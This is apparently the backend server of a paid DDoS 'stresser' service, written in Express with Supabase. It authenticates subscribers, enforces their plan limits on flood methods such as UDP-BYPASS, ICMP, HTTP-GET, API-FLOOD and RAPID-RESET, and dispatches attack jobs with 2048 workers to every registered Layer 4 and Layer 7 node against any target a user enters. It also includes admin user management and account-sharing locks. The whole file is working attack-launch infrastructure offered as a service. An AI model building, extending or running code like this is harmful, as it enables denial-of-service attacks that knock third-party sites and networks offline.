import express from "express";
import { createHmac, timingSafeEqual } from "crypto";
import { createClient } from "@supabase/supabase-js";

const app = express();
app.use(express.json());
app.set("trust proxy", true);

const SUPABASE_URL         = process.env.VITE_SUPABASE_URL || "https://fyzbqbubsdkjrmppkdsl.supabase.co";
const SUPABASE_SERVICE_KEY = process.env.VITE_SUPABASE_SERVICE_KEY;
const SESSION_SECRET       = process.env.SESSION_SECRET;

if (!SUPABASE_SERVICE_KEY) {
  console.error("[proxy] FATAL: VITE_SUPABASE_SERVICE_KEY is not set.");
  process.exit(1);
}
if (!SESSION_SECRET) {
  console.error("[proxy] FATAL: SESSION_SECRET is not set.");
  process.exit(1);
}

const supabaseAdmin = createClient(SUPABASE_URL, SUPABASE_SERVICE_KEY, {
  auth: { autoRefreshToken: false, persistSession: false },
});

const L4_METHODS = new Set(["UDP-NORMAL", "UDP-BYPASS", "ICMP"]);
const L7_METHODS = new Set(["HTTP-GET", "HTTP-POST", "API-FLOOD", "RAPID-RESET"]);

// ── HMAC launch tokens (anti-replay, serverless-compatible) ───────────────────
// Stateless: no in-memory store needed, works across serverless instances.
// Token = base64url( userId|timestamp|hmac-sha256 )
// Tied to user + expires in 30 s. Copying a DevTools payload is useless after expiry.
const TOKEN_TTL_MS = 30_000;

function generateLaunchToken(userId) {
  const data = `${userId}|${Date.now()}`;
  const sig  = createHmac("sha256", SESSION_SECRET).update(data).digest("hex");
  return Buffer.from(`${data}|${sig}`).toString("base64url");
}

function consumeLaunchToken(rawToken, userId) {
  if (!rawToken) return { ok: false, reason: "Missing launch token — request one first" };
  try {
    const decoded = Buffer.from(rawToken, "base64url").toString("utf8");
    const lastBar = decoded.lastIndexOf("|");
    if (lastBar === -1) return { ok: false, reason: "Malformed launch token" };
    const sig  = decoded.slice(lastBar + 1);
    const data = decoded.slice(0, lastBar);
    const [tokenUserId, tsStr] = data.split("|");
    if (!tokenUserId || !tsStr) return { ok: false, reason: "Malformed launch token" };

    // Timing-safe HMAC verification (prevents timing attacks)
    const expectedSig = createHmac("sha256", SESSION_SECRET).update(data).digest("hex");
    const sBuf = Buffer.from(sig,         "hex");
    const eBuf = Buffer.from(expectedSig, "hex");
    if (sBuf.length !== eBuf.length || !timingSafeEqual(sBuf, eBuf))
      return { ok: false, reason: "Invalid launch token" };

    // Expiry
    const ts = parseInt(tsStr, 10);
    if (isNaN(ts) || Date.now() - ts > TOKEN_TTL_MS)
      return { ok: false, reason: "Launch token expired — request a new one" };

    // User binding
    if (tokenUserId !== userId) return { ok: false, reason: "Launch token user mismatch" };

    return { ok: true };
  } catch {
    return { ok: false, reason: "Invalid launch token" };
  }
}

// The setting is stored server-side so the admin switch applies before login.
// Fail open if the setting table is temporarily unavailable; the feature defaults off.
async function isIpLockEnabled() {
  const { data, error } = await supabaseAdmin
    .from("security_settings")
    .select("ip_lock_enabled")
    .eq("id", 1)
    .maybeSingle();
  if (error) {
    console.error("[security] Could not read IP lock setting:", error.message);
    return false;
  }
  return data?.ip_lock_enabled === true;
}

// ── Auth middleware — verify JWT and load profile ─────────────────────────────
async function requireAuth(req, res, next) {
  const token = req.headers.authorization?.replace("Bearer ", "");
  if (!token) return res.status(401).json({ error: "Unauthorized" });

  const { data: { user }, error: authErr } = await supabaseAdmin.auth.getUser(token);
  if (authErr || !user) return res.status(401).json({ error: "Unauthorized" });

  const { data: profile, error: profileErr } = await supabaseAdmin
    .from("profiles")
    .select("id, is_admin, is_suspended, plan_id, plan:plans(id, name, methods, access_layers, max_duration, max_daily_runs)")
    .eq("id", user.id)
    .single();

  if (profileErr || !profile) return res.status(403).json({ error: profileErr?.message ?? "Profile not found" });
  if (await isIpLockEnabled() && profile.is_suspended) return res.status(403).json({ error: "This account is suspended. Contact an administrator.", code: "ACCOUNT_SUSPENDED" });

  req.user    = user;
  req.profile = profile;
  req.isAdmin = !!profile.is_admin;
  next();
}

// ── Admin-only guard (must run after requireAuth) ─────────────────────────────
function requireAdmin(req, res, next) {
  if (!req.isAdmin) return res.status(403).json({ error: "Admin access required" });
  next();
}

// ── Single-login IP lock ──────────────────────────────────────────────────────
function getClientIp(req) {
  const forwarded = req.headers["x-forwarded-for"];
  const raw = req.headers["cf-connecting-ip"] || req.headers["x-real-ip"] || req.ip || (typeof forwarded === "string" ? forwarded.split(",")[0] : "") || req.socket.remoteAddress || "";
  return String(raw).trim().replace(/^::ffff:/, "");
}

// Called immediately after password authentication. The first IP is trusted;
// a later login from another IP suspends the account until an admin unlocks it.
app.post("/proxy/security/check-login", requireAuth, async (req, res) => {
  if (!(await isIpLockEnabled())) return res.json({ ok: true, enforcementEnabled: false });

  const ip = getClientIp(req);
  if (!ip || ip === "unknown") return res.status(503).json({ error: "Could not determine the login network. Try again." });

  const { data: profile, error: profileErr } = await supabaseAdmin
    .from("profiles")
    .select("login_ip, is_suspended")
    .eq("id", req.user.id)
    .single();
  if (profileErr || !profile) return res.status(500).json({ error: "Could not verify account security." });
  if (profile.is_suspended) return res.status(403).json({ error: "This account is suspended. Contact an administrator.", code: "ACCOUNT_SUSPENDED" });

  if (!profile.login_ip) {
    const { error } = await supabaseAdmin.from("profiles").update({ login_ip: ip }).eq("id", req.user.id);
    if (error) return res.status(500).json({ error: "Could not save the login network." });
    return res.json({ ok: true, firstLogin: true });
  }

  if (profile.login_ip !== ip) {
    const { error } = await supabaseAdmin.from("profiles").update({
      is_suspended: true,
      suspended_at: new Date().toISOString(),
      suspended_reason: "Login from an unrecognized IP address",
    }).eq("id", req.user.id);
    if (error) return res.status(500).json({ error: "Could not suspend the account safely." });
    return res.status(403).json({ error: "This account was suspended because it was accessed from a different network.", code: "ACCOUNT_SUSPENDED" });
  }

  return res.json({ ok: true, firstLogin: false });
});

// ── GET /proxy/launch-token ───────────────────────────────────────────────────
app.get("/proxy/launch-token", requireAuth, (req, res) => {
  const token = generateLaunchToken(req.user.id);
  res.json({ token, expiresIn: TOKEN_TTL_MS / 1000 });
});

// ── GET /proxy/__cron ─────────────────────────────────────────────────────────
// Called by Vercel Cron every 2 min to expire stale runs.
// Set CRON_SECRET env var on Vercel and configure vercel.json headers accordingly.
app.get("/proxy/__cron", async (req, res) => {
  const provided = req.headers["x-cron-secret"] ?? req.query.secret;
  if (!process.env.CRON_SECRET || provided !== process.env.CRON_SECRET)
    return res.status(401).json({ error: "Unauthorized" });
  await cleanupExpiredRuns();
  res.json({ ok: true });
});

// ── Policy check ──────────────────────────────────────────────────────────────
async function checkPolicy(req, layer, method, duration) {
  const { isAdmin, profile } = req;
  const plan = profile.plan;

  if (!isAdmin && !plan) return { ok: false, status: 403, error: "No plan assigned to your account" };

  if (!isAdmin) {
    if (!plan.access_layers?.includes(layer))
      return { ok: false, status: 403, error: `Your plan does not include ${layer} access` };
    if (!plan.methods?.includes(method))
      return { ok: false, status: 403, error: `Your plan does not include the ${method} method` };
    if (plan.max_duration > 0 && duration > plan.max_duration)
      return { ok: false, status: 403, error: `Duration ${duration}s exceeds your plan limit of ${plan.max_duration}s` };
    if (plan.max_daily_runs > 0) {
      const startOfDay = new Date();
      startOfDay.setHours(0, 0, 0, 0);
      const table = layer === "L4" ? "l4_runs" : "l7_runs";
      const { count } = await supabaseAdmin
        .from(table)
        .select("id", { count: "exact", head: true })
        .eq("user_id", req.user.id)
        .gte("created_at", startOfDay.toISOString());
      if ((count ?? 0) >= plan.max_daily_runs)
        return { ok: false, status: 429, error: `Daily limit reached (${plan.max_daily_runs} runs/day). Resets at midnight.` };
    }
  }

  const rpcName = layer === "L4" ? "is_l4_busy" : "is_l7_busy";
  const { data: busy, error: rpcErr } = await supabaseAdmin.rpc(rpcName);
  if (rpcErr) return { ok: false, status: 500, error: `Could not check busy state: ${rpcErr.message}` };
  if (busy) return { ok: false, status: 409, error: `An ${layer} attack is already running. Wait for it to finish.` };

  return { ok: true };
}

// ── Helper: fetch with timeout ────────────────────────────────────────────────
async function fetchWithTimeout(url, options, ms = 15000) {
  const controller = new AbortController();
  const timer = setTimeout(() => controller.abort(), ms);
  try {
    return await fetch(url, { ...options, signal: controller.signal });
  } finally {
    clearTimeout(timer);
  }
}

// ── POST /proxy/l7/start ──────────────────────────────────────────────────────
app.post("/proxy/l7/start", requireAuth, async (req, res) => {
  const { target, method, duration, launch_token } = req.body;

  const tok = consumeLaunchToken(launch_token, req.user.id);
  if (!tok.ok) return res.status(403).json({ error: tok.reason });

  if (!target || typeof target !== "string" || !target.trim())
    return res.status(400).json({ error: "Invalid target" });
  if (!L7_METHODS.has(method))
    return res.status(400).json({ error: `Invalid L7 method: ${method}` });
  const dur = parseInt(duration, 10);
  if (!dur || dur < 1)
    return res.status(400).json({ error: "Invalid duration" });

  const policy = await checkPolicy(req, "L7", method, dur);
  if (!policy.ok) return res.status(policy.status).json({ error: policy.error });

  const { data: apis, error } = await supabaseAdmin.from("layer7_apis").select("url");
  if (error) return res.status(500).json({ error: "Failed to fetch L7 nodes" });
  if (!apis?.length) return res.json({ total: 0, online: 0, results: [] });

  const body = {
    target:     target.trim(),
    method:     method.toLowerCase().replace(/-/g, ""),
    duration:   dur,
    workers:    2048,
    verbose:    false,
    rate_delay: 0,
  };

  await Promise.allSettled(
    apis.map((api) => fetch(`${api.url}/api/attack/stop`, { method: "POST" }).catch(() => {}))
  );
  await new Promise((r) => setTimeout(r, 500));

  const settled = await Promise.allSettled(
    apis.map(async (api) => {
      try {
        const r = await fetchWithTimeout(`${api.url}/api/attack/start`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(body),
        });
        if (!r.ok) throw new Error(`HTTP ${r.status} ${r.statusText}`);
        const data = await r.json();
        return { success: true, data };
      } catch (err) {
        return { success: false, error: err.name === "AbortError" ? "timed out (15 s)" : err.message };
      }
    })
  );

  const results = settled.map((s) => s.status === "fulfilled" ? s.value : { success: false, error: s.reason?.message ?? String(s.reason) });
  const online  = results.filter((r) => r.success).length;
  res.json({ total: apis.length, online, results });
});

// ── POST /proxy/l7/stop ───────────────────────────────────────────────────────
app.post("/proxy/l7/stop", requireAuth, async (req, res) => {
  // Only allow if user has an active L7 run (or is admin)
  if (!req.isAdmin) {
    const { count } = await supabaseAdmin
      .from("l7_runs")
      .select("id", { count: "exact", head: true })
      .eq("user_id", req.user.id)
      .eq("status", "running");
    if (!count) return res.status(403).json({ error: "No active L7 attack to stop" });
  }

  const { data: apis } = await supabaseAdmin.from("layer7_apis").select("url");
  if (apis?.length) {
    await Promise.allSettled(
      apis.map((api) => fetch(`${api.url}/api/attack/stop`, { method: "POST" }).catch(() => {}))
    );
  }
  res.json({ ok: true });
});

// ── POST /proxy/l4/start ──────────────────────────────────────────────────────
app.post("/proxy/l4/start", requireAuth, async (req, res) => {
  const { target, port, method, duration, launch_token } = req.body;

  const tok = consumeLaunchToken(launch_token, req.user.id);
  if (!tok.ok) return res.status(403).json({ error: tok.reason });

  if (!target || typeof target !== "string" || !target.trim())
    return res.status(400).json({ error: "Invalid target" });
  if (!L4_METHODS.has(method))
    return res.status(400).json({ error: `Invalid L4 method: ${method}` });
  const dur = parseInt(duration, 10);
  if (!dur || dur < 1)
    return res.status(400).json({ error: "Invalid duration" });
  if (method === "UDP-NORMAL") {
    const p = parseInt(port, 10);
    if (!p || p < 1 || p > 65535)
      return res.status(400).json({ error: "Invalid port" });
  }

  const policy = await checkPolicy(req, "L4", method, dur);
  if (!policy.ok) return res.status(policy.status).json({ error: policy.error });

  const { data: apis, error } = await supabaseAdmin.from("layer4_apis").select("url");
  if (error) return res.status(500).json({ error: "Failed to fetch L4 nodes" });
  if (!apis?.length) return res.json({ total: 0, online: 0, results: [] });

  let body;
  if (method === "UDP-NORMAL") {
    body = { method: 1, ip: target.trim(), port: parseInt(port, 10), duration: dur };
  } else if (method === "UDP-BYPASS") {
    body = { method: 2, ip: target.trim(), time: dur };
  } else {
    // ICMP
    body = { method: 3, ip: target.trim(), duration: dur };
  }

  const settled = await Promise.allSettled(
    apis.map(async (api) => {
      try {
        const r = await fetchWithTimeout(`${api.url}/api/hit`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(body),
        });
        if (!r.ok) throw new Error(`HTTP ${r.status} ${r.statusText}`);
        const data = await r.json();
        if (!data?.instance_id) throw new Error("No instance_id in response");
        return { success: true, instance_id: data.instance_id };
      } catch (err) {
        return { success: false, error: err.name === "AbortError" ? "timed out (15 s)" : err.message };
      }
    })
  );

  const results = settled.map((s) => s.status === "fulfilled" ? s.value : { success: false, error: s.reason?.message ?? String(s.reason) });
  const online  = results.filter((r) => r.success).length;
  res.json({ total: apis.length, online, results });
});

// ── POST /proxy/l4/stop ───────────────────────────────────────────────────────
app.post("/proxy/l4/stop", requireAuth, async (req, res) => {
  if (!req.isAdmin) {
    const { count } = await supabaseAdmin
      .from("l4_runs")
      .select("id", { count: "exact", head: true })
      .eq("user_id", req.user.id)
      .eq("status", "running");
    if (!count) return res.status(403).json({ error: "No active L4 attack to stop" });
  }

  const { data: apis } = await supabaseAdmin.from("layer4_apis").select("url");
  if (apis?.length) {
    await Promise.allSettled(
      apis.map((api) => fetch(`${api.url}/api/stop/all`, { method: "POST" }).catch(() => {}))
    );
  }
  res.json({ ok: true });
});

// ── Admin: activity log ───────────────────────────────────────────────────────
// GET /proxy/admin/activity
app.get("/proxy/admin/activity", requireAuth, requireAdmin, async (req, res) => {
  const [{ data: l4Data, error: e1 }, { data: l7Data, error: e2 }] = await Promise.all([
    supabaseAdmin
      .from("l4_runs")
      .select("*, profile:profiles(full_name, email)")
      .order("created_at", { ascending: false })
      .limit(500),
    supabaseAdmin
      .from("l7_runs")
      .select("*, profile:profiles(full_name, email)")
      .order("created_at", { ascending: false })
      .limit(500),
  ]);
  if (e1 || e2) return res.status(500).json({ error: (e1 || e2).message });
  const combined = [
    ...(l4Data || []).map((r) => ({ ...r, layer: "L4" })),
    ...(l7Data || []).map((r) => ({ ...r, layer: "L7" })),
  ].sort((a, b) => new Date(b.created_at) - new Date(a.created_at));
  res.json({ runs: combined });
});

// ── Admin: user management endpoints ─────────────────────────────────────────

// GET/PATCH /proxy/admin/security-settings — global IP lock switch
app.get("/proxy/admin/security-settings", requireAuth, requireAdmin, async (req, res) => {
  const { data, error } = await supabaseAdmin
    .from("security_settings")
    .select("ip_lock_enabled, updated_at")
    .eq("id", 1)
    .maybeSingle();
  if (error) return res.status(500).json({ error: error.message });
  res.json({ ip_lock_enabled: data?.ip_lock_enabled === true, updated_at: data?.updated_at ?? null });
});

app.patch("/proxy/admin/security-settings", requireAuth, requireAdmin, async (req, res) => {
  const { ip_lock_enabled } = req.body;
  if (typeof ip_lock_enabled !== "boolean") return res.status(400).json({ error: "ip_lock_enabled must be a boolean" });
  const { data, error } = await supabaseAdmin
    .from("security_settings")
    .upsert({ id: 1, ip_lock_enabled, updated_at: new Date().toISOString() }, { onConflict: "id" })
    .select("ip_lock_enabled, updated_at")
    .single();
  if (error) return res.status(400).json({ error: error.message });
  res.json(data);
});

// GET /proxy/admin/users
app.get("/proxy/admin/users", requireAuth, requireAdmin, async (req, res) => {
  const { data, error } = await supabaseAdmin.auth.admin.listUsers();
  if (error) return res.status(500).json({ error: error.message });

  const users = data.users || [];
  const ids = users.map((user) => user.id);
  const { data: securityRows, error: securityError } = ids.length
    ? await supabaseAdmin.from("profiles").select("id, is_suspended, login_ip, suspended_at, suspended_reason").in("id", ids)
    : { data: [], error: null };
  if (securityError) return res.status(500).json({ error: securityError.message });

  const securityById = Object.fromEntries((securityRows || []).map((row) => [row.id, row]));
  res.json({
    users: users.map((user) => ({ ...user, security: securityById[user.id] || null })),
  });
});

// POST /proxy/admin/users — create user
app.post("/proxy/admin/users", requireAuth, requireAdmin, async (req, res) => {
  const { email, password, full_name, plan_id } = req.body;
  if (!email || !password) return res.status(400).json({ error: "Email and password are required" });

  const { data, error } = await supabaseAdmin.auth.admin.createUser({
    email,
    password,
    email_confirm: true,
    user_metadata: { full_name: full_name || null },
  });
  if (error) return res.status(400).json({ error: error.message });

  if (full_name || plan_id) {
    await supabaseAdmin.from("profiles").update({
      full_name: full_name || null,
      plan_id:   plan_id   || null,
    }).eq("id", data.user.id);
  }

  res.json({ user: data.user });
});

// DELETE /proxy/admin/users/:id
app.delete("/proxy/admin/users/:id", requireAuth, requireAdmin, async (req, res) => {
  const { id } = req.params;
  const { error } = await supabaseAdmin.auth.admin.deleteUser(id);
  if (error) return res.status(400).json({ error: error.message });
  res.json({ ok: true });
});

// PATCH /proxy/admin/users/:id/profile — update profile fields
app.patch("/proxy/admin/users/:id/profile", requireAuth, requireAdmin, async (req, res) => {
  const { id } = req.params;
  const { full_name, plan_id, is_admin } = req.body;
  const update = {};
  if (full_name  !== undefined) update.full_name = full_name;
  if (plan_id    !== undefined) update.plan_id   = plan_id;
  if (is_admin   !== undefined) update.is_admin  = is_admin;

  const { error } = await supabaseAdmin.from("profiles").update(update).eq("id", id);
  if (error) return res.status(400).json({ error: error.message });
  res.json({ ok: true });
});

// POST /proxy/admin/users/:id/unlock — clear the IP lock and suspension
app.post("/proxy/admin/users/:id/unlock", requireAuth, requireAdmin, async (req, res) => {
  const { id } = req.params;
  const { error } = await supabaseAdmin.from("profiles").update({
    login_ip: null,
    is_suspended: false,
    suspended_at: null,
    suspended_reason: null,
  }).eq("id", id);
  if (error) return res.status(400).json({ error: error.message });
  res.json({ ok: true });
});

// ── Server-side auto-expire cleanup (runs every 30 s) ────────────────────────
async function cleanupExpiredRuns() {
  try {
    const now = new Date().toISOString();
    for (const table of ["l4_runs", "l7_runs"]) {
      const { data, error } = await supabaseAdmin
        .from(table)
        .select("id, started_at, duration")
        .in("status", ["running", "queued"]);
      if (error) { console.error(`[cleanup] Failed to fetch ${table}:`, error.message); continue; }
      if (!data?.length) continue;
      const expired = data.filter((r) => {
        const base = r.started_at
          ? new Date(r.started_at).getTime()
          : 0; // queued with no started_at — will be caught by the +30s grace in Panel
        return base > 0 && base + r.duration * 1000 <= Date.now();
      });
      if (expired.length) {
        await Promise.allSettled(
          expired.map((r) =>
            supabaseAdmin.from(table).update({ status: "success", stopped_at: now }).eq("id", r.id)
          )
        );
        console.log(`[cleanup] Expired ${expired.length} run(s) in ${table}`);
      }
    }
  } catch (err) {
    console.error("[cleanup] Unhandled error:", err.message);
  }
}
// ── Entry point ───────────────────────────────────────────────────────────────
// When run directly (Replit dev): start the HTTP server + cleanup interval.
// When imported by Vercel: just export the app — the runtime handles listening.
const isMain = process.argv[1] && new URL(import.meta.url).pathname === process.argv[1];
if (isMain) {
  setInterval(cleanupExpiredRuns, 30_000);
  const PORT = process.env.PORT || 3001;
  app.listen(PORT, () => console.log(`[proxy] Server running on port ${PORT}`));
}

export default app;
